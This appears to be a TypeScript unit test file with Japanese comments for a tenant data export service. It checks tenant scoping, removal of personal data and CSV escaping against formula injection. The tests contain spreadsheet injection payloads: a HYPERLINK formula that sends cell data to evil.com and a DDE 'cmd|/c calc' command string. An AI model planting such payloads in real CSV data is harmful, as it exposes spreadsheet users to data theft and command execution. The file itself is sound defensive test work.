/**
 * テナントデータ一括エクスポートサービスの単体テスト (P-C / 2026-05-08)
 *
 * 検証項目:
 *   - テナント不在時 → TENANT_NOT_FOUND
 *   - テナントスコープ: 他テナントのデータが ZIP に含まれない
 *   - User の PII (passwordHash 等) が ZIP に含まれない
 *   - ZIP 構造: README.md / metadata.json / data/*.json / csv/*.csv
 *   - 件数サマリの正確性
 *   - 空テナントでも有効な ZIP が生成される
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import JSZip from 'jszip';

vi.mock('@/lib/db', () => ({
  prisma: {
    tenant: { findFirst: vi.fn() },
    project: { findMany: vi.fn() },
    task: { findMany: vi.fn() },
    estimate: { findMany: vi.fn() },
    projectMember: { findMany: vi.fn() },
    knowledge: { findMany: vi.fn() },
    knowledgeProject: { findMany: vi.fn() },
    riskIssue: { findMany: vi.fn() },
    // PR feat/asset-multi-project-linking: M:N 中間テーブル
    riskIssueProject: { findMany: vi.fn() },
    retrospective: { findMany: vi.fn() },
    retrospectiveProject: { findMany: vi.fn() },
    memo: { findMany: vi.fn() },
    customer: { findMany: vi.fn() },
    stakeholder: { findMany: vi.fn() },
    comment: { findMany: vi.fn() },
    mention: { findMany: vi.fn() },
    attachment: { findMany: vi.fn() },
    user: { findMany: vi.fn() },
  },
}));

import {
  exportTenantData,
  csvEscape,
  USER_EXPORT_FIELDS,
  USER_PII_FIELDS,
} from './data-export.service';
import { Prisma } from '@/generated/prisma/client';
import { prisma } from '@/lib/db';

const TENANT_ID = 'tenant-uuid-1';

beforeEach(() => {
  vi.clearAllMocks();
  // デフォルトはすべて空配列を返す
  vi.mocked(prisma.tenant.findFirst).mockResolvedValue({
    id: TENANT_ID,
    name: 'カスタマーA',
    slug: 'customer-a',
    // PR-1 (2026-05-15): テナント単位 i18n
    timezone: 'Asia/Tokyo',
    locale: 'ja-JP',
  } as never);
  vi.mocked(prisma.project.findMany).mockResolvedValue([]);
  vi.mocked(prisma.task.findMany).mockResolvedValue([]);
  vi.mocked(prisma.estimate.findMany).mockResolvedValue([]);
  vi.mocked(prisma.projectMember.findMany).mockResolvedValue([]);
  vi.mocked(prisma.knowledge.findMany).mockResolvedValue([]);
  vi.mocked(prisma.knowledgeProject.findMany).mockResolvedValue([]);
  vi.mocked(prisma.riskIssue.findMany).mockResolvedValue([]);
  vi.mocked(prisma.riskIssueProject.findMany).mockResolvedValue([]);
  vi.mocked(prisma.retrospective.findMany).mockResolvedValue([]);
  vi.mocked(prisma.retrospectiveProject.findMany).mockResolvedValue([]);
  vi.mocked(prisma.memo.findMany).mockResolvedValue([]);
  vi.mocked(prisma.customer.findMany).mockResolvedValue([]);
  vi.mocked(prisma.stakeholder.findMany).mockResolvedValue([]);
  vi.mocked(prisma.comment.findMany).mockResolvedValue([]);
  vi.mocked(prisma.mention.findMany).mockResolvedValue([]);
  vi.mocked(prisma.attachment.findMany).mockResolvedValue([]);
  vi.mocked(prisma.user.findMany).mockResolvedValue([]);
});

describe('exportTenantData', () => {
  it('テナント不在なら TENANT_NOT_FOUND', async () => {
    vi.mocked(prisma.tenant.findFirst).mockResolvedValueOnce(null);

    await expect(exportTenantData('non-existent')).rejects.toThrow('TENANT_NOT_FOUND');
  });

  it('空テナントでも有効な ZIP が生成される (README + metadata + data/ + csv/)', async () => {
    const result = await exportTenantData(TENANT_ID);

    expect(result.zipBuffer).toBeInstanceOf(Uint8Array);
    expect(result.zipBuffer.length).toBeGreaterThan(0);
    expect(result.filename).toMatch(/^tasukiba-export-customer-a-\d{4}-\d{2}-\d{2}\.zip$/);

    // ZIP を解凍して内容を verify
    const zip = await JSZip.loadAsync(result.zipBuffer);
    expect(zip.file('README.md')).not.toBeNull();
    expect(zip.file('metadata.json')).not.toBeNull();
    expect(zip.file('data/projects.json')).not.toBeNull();
    expect(zip.file('data/users.json')).not.toBeNull();
    expect(zip.file('csv/projects.csv')).not.toBeNull();
    expect(zip.file('csv/knowledge.csv')).not.toBeNull();
  });

  it('件数サマリが正確に計上される', async () => {
    vi.mocked(prisma.project.findMany).mockResolvedValueOnce([
      { id: 'p1' } as never,
      { id: 'p2' } as never,
    ] as never);
    vi.mocked(prisma.knowledge.findMany).mockResolvedValueOnce([
      { id: 'k1' } as never,
    ] as never);
    vi.mocked(prisma.user.findMany).mockResolvedValueOnce([
      { id: 'u1', email: 'a@b.co', passwordHash: 'x' } as never,
      { id: 'u2', email: 'c@d.co', passwordHash: 'y' } as never,
      { id: 'u3', email: 'e@f.co', passwordHash: 'z' } as never,
    ] as never);

    const result = await exportTenantData(TENANT_ID);

    expect(result.summary.counts.projects).toBe(2);
    expect(result.summary.counts.knowledge).toBe(1);
    expect(result.summary.counts.users).toBe(3);
  });

  it('User の PII (passwordHash / mfaSecret 等) は ZIP に含まれない', async () => {
    vi.mocked(prisma.user.findMany).mockResolvedValueOnce([
      {
        id: 'u1',
        name: 'ユーザA',
        email: 'a@b.co',
        passwordHash: 'should_not_appear',
        systemRole: 'admin',
        isActive: true,
        mfaSecretEncrypted: 'should_not_appear_either',
        mfaEnabled: true,
        failedLoginCount: 5,
        lockedUntil: new Date(),
        permanentLock: true,
        forcePasswordChange: true,
        themePreference: 'light',
        // PR-1 (2026-05-15): timezone/locale はテナント単位に移行したため User からは出力されない
        lastLoginAt: new Date(),
        createdAt: new Date(),
        updatedAt: new Date(),
      },
    ] as never);

    const result = await exportTenantData(TENANT_ID);
    const zip = await JSZip.loadAsync(result.zipBuffer);
    const usersJson = await zip.file('data/users.json')?.async('string');

    expect(usersJson).not.toContain('should_not_appear');
    expect(usersJson).not.toContain('passwordHash');
    expect(usersJson).not.toContain('mfaSecretEncrypted');
    expect(usersJson).not.toContain('failedLoginCount');
    expect(usersJson).not.toContain('permanentLock');
    expect(usersJson).not.toContain('forcePasswordChange');

    // ホワイトリストの列は含まれる
    expect(usersJson).toContain('name');
    expect(usersJson).toContain('email');
    expect(usersJson).toContain('systemRole');
    expect(usersJson).toContain('themePreference');
  });

  it('テナントスコープが where 句に含まれる (= 他テナントデータは混入しない)', async () => {
    await exportTenantData(TENANT_ID);

    // 全 entity の findMany が tenantId 条件付きで呼ばれていることを確認
    expect(prisma.project.findMany).toHaveBeenCalledWith(
      expect.objectContaining({
        where: expect.objectContaining({ tenantId: TENANT_ID }),
      }),
    );
    expect(prisma.knowledge.findMany).toHaveBeenCalledWith(
      expect.objectContaining({
        where: expect.objectContaining({ tenantId: TENANT_ID }),
      }),
    );
    expect(prisma.user.findMany).toHaveBeenCalledWith(
      expect.objectContaining({
        where: expect.objectContaining({ tenantId: TENANT_ID }),
      }),
    );
    expect(prisma.customer.findMany).toHaveBeenCalledWith(
      expect.objectContaining({
        where: expect.objectContaining({ tenantId: TENANT_ID }),
      }),
    );
  });

  it('CSV 出力に UTF-8 BOM が付与される (Excel 日本語対応)', async () => {
    vi.mocked(prisma.project.findMany).mockResolvedValueOnce([
      {
        id: 'p1',
        name: 'プロジェクトA',
        purpose: '日本語データ',
        status: 'planning',
        createdAt: new Date('2026-01-01'),
      } as never,
    ] as never);

    const result = await exportTenantData(TENANT_ID);
    const zip = await JSZip.loadAsync(result.zipBuffer);
    const projectsCsv = await zip.file('csv/projects.csv')?.async('string');

    // UTF-8 BOM (﻿) で始まる
    expect(projectsCsv?.charCodeAt(0)).toBe(0xfeff);
    expect(projectsCsv).toContain('プロジェクトA');
    expect(projectsCsv).toContain('日本語データ');
    // 2026-06-04: CSV ヘッダは画面に合わせた日本語ラベル (英語フィールド名でない)
    const header = projectsCsv?.replace(/^﻿/, '').split('\r\n')[0];
    expect(header).toContain('プロジェクト名');
    expect(header).toContain('開始予定日');
    expect(header).not.toContain('plannedStartDate');
    // 2026-06-04: 選択値も画面の日本語表示 (内部コードでない)
    expect(projectsCsv).toContain('企画中');
    expect(projectsCsv).not.toContain('planning');
  });

  it('Date は ISO 8601 文字列に変換される (JSON 内)', async () => {
    const fixedDate = new Date('2026-05-08T12:34:56.000Z');
    vi.mocked(prisma.project.findMany).mockResolvedValueOnce([
      {
        id: 'p1',
        name: 'P1',
        createdAt: fixedDate,
        updatedAt: fixedDate,
      } as never,
    ] as never);

    const result = await exportTenantData(TENANT_ID);
    const zip = await JSZip.loadAsync(result.zipBuffer);
    const projectsJson = await zip.file('data/projects.json')?.async('string');

    expect(projectsJson).toContain('2026-05-08T12:34:56.000Z');
  });

  it('metadata.json にエクスポート情報が含まれる', async () => {
    const result = await exportTenantData(TENANT_ID);
    const zip = await JSZip.loadAsync(result.zipBuffer);
    const metaStr = await zip.file('metadata.json')?.async('string');
    expect(metaStr).toBeTruthy();

    const meta = JSON.parse(metaStr ?? '{}');
    expect(meta.tenantId).toBe(TENANT_ID);
    expect(meta.tenantName).toBe('カスタマーA');
    expect(meta.tenantSlug).toBe('customer-a');
    expect(meta.exportedAt).toMatch(/^\d{4}-\d{2}-\d{2}T/);
    expect(meta.counts).toBeDefined();
  });
});

// 2026-05-13 (security/csv-formula-injection, B-4): CWE-1236 (CSV Formula Injection) 回帰テスト。
//   Excel/Google Sheets が `=`/`+`/`-`/`@`/`\t`/`\r` で始まる値を **数式評価** する挙動を悪用し、
//   admin/super が CSV を開いた瞬間に外部 URL を踏まされる攻撃を防ぐ。
//   攻撃ペイロード例: `=HYPERLINK("https://evil.com/?"&A1, "click")` を displayName に入れる
describe('csvEscape (B-4: Formula Injection 対策)', () => {
  it('= で始まる値に `\'` を前置する (=HYPERLINK 等)', () => {
    expect(csvEscape('=HYPERLINK("https://evil.com")')).toBe(
      `"'=HYPERLINK(""https://evil.com"")"`,
    );
  });
  it('@ で始まる値に `\'` を前置する (@SUM 等)', () => {
    expect(csvEscape('@SUM(1+1)')).toBe(`'@SUM(1+1)`);
  });
  it('+ で始まる値に `\'` を前置する', () => {
    expect(csvEscape('+1+1')).toBe(`'+1+1`);
  });
  it('- で始まる値に `\'` を前置する (-2+3 等)', () => {
    expect(csvEscape('-2+3+cmd|"/c calc"!A1')).toBe(
      `"'-2+3+cmd|""/c calc""!A1"`,
    );
  });
  it('タブ (\\t) で始まる値に `\'` を前置する (DDE)', () => {
    expect(csvEscape('\tDDE("cmd")')).toBe(`"'\tDDE(""cmd"")"`);
  });
  it('CR (\\r) で始まる値に `\'` を前置する', () => {
    expect(csvEscape('\rDDE')).toBe(`"'\rDDE"`);
  });
  it('安全な文字列 (英数字始まり) は変更しない', () => {
    expect(csvEscape('Hello World')).toBe('Hello World');
    expect(csvEscape('Project A')).toBe('Project A');
    expect(csvEscape('123 ABC')).toBe('123 ABC');
  });
  it('null / undefined は空文字', () => {
    expect(csvEscape(null)).toBe('');
    expect(csvEscape(undefined)).toBe('');
  });
  it('formula 文字を中途に含む値は対象外 (先頭のみが評価される)', () => {
    expect(csvEscape('total = 5')).toBe('total = 5');
    expect(csvEscape('a+b')).toBe('a+b');
  });
  it('RFC 4180 エスケープと Formula Injection 対策の併用', () => {
    // 数式 + カンマ → `'` 前置 + " で囲む + " を "" にエスケープ
    expect(csvEscape('=cmd("a,b")')).toBe(`"'=cmd(""a,b"")"`);
  });
  it('Date / オブジェクトも安全に処理', () => {
    expect(csvEscape(new Date('2026-06-01T00:00:00Z'))).toBe(
      '2026-06-01T00:00:00.000Z',
    );
    // JSON.stringify は `{` で始まるので formula 対象外
    expect(csvEscape({ key: 'value' })).toBe(`"{""key"":""value""}"`);
  });
});

// 2026-05-13 (security/data-export-pii-ci-guard, L-6): User schema の列追加で
//   `stripUserPII` のホワイトリストを更新し忘れ → 意図せず PII が JSON 出力に混入する
//   退行を CI で確実に検知する。Prisma の UserScalarFieldEnum から全列名を取得し、
//   USER_EXPORT_FIELDS ∪ USER_PII_FIELDS が完全一致することを assert。
//
//   新フィールドが追加された PR は本テストが fail し、どちらか一方に分類するまで
//   マージできない (= 「未分類列が PII として漏洩」「重要列が出力から漏れる」事故を防ぐ)。
describe('User export PII whitelist CI guard (L-6)', () => {
  it('USER_EXPORT_FIELDS と USER_PII_FIELDS の和が UserScalarFieldEnum と完全一致する', () => {
    const allDbFields = new Set(Object.keys(Prisma.UserScalarFieldEnum));
    const exportFields = new Set<string>(USER_EXPORT_FIELDS);
    const piiFields = new Set<string>(USER_PII_FIELDS);

    // 1. 出力と PII が重複していないこと
    const intersection = [...exportFields].filter((f) => piiFields.has(f));
    expect(intersection, '出力 fields と PII fields は重複してはいけない').toEqual([]);

    // 2. 和集合が DB の全列と一致すること
    const union = new Set([...exportFields, ...piiFields]);
    const unclassified = [...allDbFields].filter((f) => !union.has(f));
    expect(
      unclassified,
      '新 User フィールドが追加されたが分類されていない。USER_EXPORT_FIELDS または USER_PII_FIELDS に追加してください',
    ).toEqual([]);

    const ghosts = [...union].filter((f) => !allDbFields.has(f));
    expect(
      ghosts,
      'USER_EXPORT_FIELDS / USER_PII_FIELDS に DB に存在しない列が記載されている',
    ).toEqual([]);
  });

  it('USER_PII_FIELDS に重要 PII が含まれている (回帰防止)', () => {
    const piiFields = new Set<string>(USER_PII_FIELDS);
    // これらは絶対に削除してはいけない (顧客データ持ち出し時の機密保護の根幹)
    expect(piiFields).toContain('passwordHash');
    expect(piiFields).toContain('mfaSecretEncrypted');
  });

  it('USER_EXPORT_FIELDS に重要識別子が含まれている (回帰防止)', () => {
    const exportFields = new Set<string>(USER_EXPORT_FIELDS);
    expect(exportFields).toContain('id');
    expect(exportFields).toContain('email');
    expect(exportFields).toContain('name');
  });
});
